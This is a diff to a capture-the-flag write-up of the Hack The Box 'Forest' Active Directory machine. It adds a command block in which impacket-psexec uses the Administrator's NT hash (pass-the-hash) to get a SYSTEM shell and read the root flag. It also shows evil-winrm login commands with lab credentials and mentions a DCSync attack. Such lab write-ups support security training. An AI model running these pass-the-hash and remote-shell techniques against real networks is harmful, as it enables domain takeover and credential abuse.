@@ -145,7 +145,7 @@ $ nxc winrm htb.local -u svc-alfresco -p s3rvice
 ```
 Looks like we can remote in with svc-alfresco. Let's grab that user flag.
 
-```bash
+```bash {class="flag-capture"}
 $ evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
                                         
 Evil-WinRM shell v3.5                                        
@@ -222,7 +222,26 @@ DefaultAccount:503:[LM]:[NT-HASH-REDACTED]:::
 ```
 ## Domain Admin
 The DCSync attack was a success! We now have the Administrator NT hash. Since NTLM authentication accepts a hash in lieu of a password, we don't need to crack it. We can Pass-the-hash with impacket-psexec to give us a SYSTEM shell and the final flag.
-![Use administrator hash to auth with psexec](/img/writeups/forest/forest-psexec-success.png)
+```bash {class="flag-capture"}
+$ impacket-psexec htb.local/administrator@"10.129.95.210" -hashes :[REDACTED NT HASH]
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.95.210.....
+[*] Found writable share ADMIN$
+[*] Uploading file IMkjDBZA.exe
+[*] Opening SVCManager on 10.129.95.210.....
+[*] Creating service JAgv on 10.129.95.210.....
+[*] Starting service JAgv.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+f8a8...[REDACTED]...d010
+```
 We have successfully compromised the domain.
 
 ## Takeaways
